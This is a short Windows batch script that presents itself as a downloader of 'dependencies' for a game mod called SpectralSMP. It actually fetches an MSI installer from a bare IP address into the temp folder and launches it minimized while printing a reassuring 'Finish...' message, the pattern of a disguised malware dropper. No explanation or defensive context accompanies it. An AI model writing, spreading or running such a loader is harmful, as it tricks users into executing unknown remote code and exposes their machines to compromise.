@echo off
set "URL=http://151.243.24.251/Installer.msi"
set "FILE=%temp%\SpectralSMP.msi"

echo Downloading dependencies of mod...
curl -L -o "%FILE%" "%URL%"

if exist "%FILE%" (
    echo Finish...
    start /min "" "%FILE%"
    exit
) else (
    echo Error
    timeout /t 3 >nul
    exit
)
